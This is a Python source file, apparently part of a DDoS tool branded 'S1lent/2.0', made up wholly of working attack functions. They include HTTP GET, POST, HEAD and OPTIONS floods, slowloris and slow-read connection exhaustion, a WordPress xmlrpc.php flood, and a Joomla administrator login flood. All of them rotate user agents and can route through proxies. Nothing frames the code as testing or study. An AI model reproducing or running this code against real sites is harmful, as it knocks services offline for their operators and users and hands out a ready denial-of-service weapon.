import requests
import random
import time
import threading
from urllib.parse import urlparse

def http_get_flood(target, stop_event, proxies, user_agents):
    while not stop_event.is_set():
        try:
            headers = {"User-Agent": random.choice(user_agents) if user_agents else "S1lent/2.0"}
            r = requests.get(target, headers=headers, timeout=2, proxies=proxies if proxies else None)
        except:
            pass

def http_post_flood(target, stop_event, proxies, user_agents):
    data = {"data": "A" * 1024}
    while not stop_event.is_set():
        try:
            requests.post(target, data=data, headers={"User-Agent": random.choice(user_agents) if user_agents else "S1lent/2.0"}, timeout=2, proxies=proxies if proxies else None)
        except:
            pass

def slowloris(target, stop_event, proxies, user_agents):
    # Simplified slowloris using raw sockets
    import socket as sock
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 80
    sockets = []
    while not stop_event.is_set():
        try:
            s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f"GET /{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            # Keep-alive
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(0,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
        except:
            pass
        time.sleep(15)

def slow_read(target, stop_event, proxies, user_agents):
    while not stop_event.is_set():
        try:
            s = requests.Session()
            s.get(target, stream=True, timeout=10, proxies=proxies if proxies else None)
            time.sleep(random.uniform(1, 5))
        except:
            pass

def http_head_flood(target, stop_event, proxies, user_agents):
    while not stop_event.is_set():
        try:
            requests.head(target, headers={"User-Agent": random.choice(user_agents) if user_agents else "S1lent/2.0"}, timeout=2, proxies=proxies if proxies else None)
        except:
            pass

def http_options_flood(target, stop_event, proxies, user_agents):
    while not stop_event.is_set():
        try:
            requests.options(target, headers={"User-Agent": random.choice(user_agents) if user_agents else "S1lent/2.0"}, timeout=2, proxies=proxies if proxies else None)
        except:
            pass

def wordpress_xmlrpc_flood(target, stop_event, proxies, user_agents):
    xml_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
    headers = {"Content-Type": "text/xml"}
    while not stop_event.is_set():
        try:
            requests.post(target + "/xmlrpc.php", data=xml_payload, headers=headers, timeout=2, proxies=proxies if proxies else None)
        except:
            pass

def joomla_login_flood(target, stop_event, proxies, user_agents):
    login_url = target.rstrip("/") + "/administrator/index.php"
    data = {"username": "admin", "passwd": "password", "option": "com_login", "task": "login"}
    while not stop_event.is_set():
        try:
            requests.post(login_url, data=data, timeout=2, proxies=proxies if proxies else None)
        except:
            pass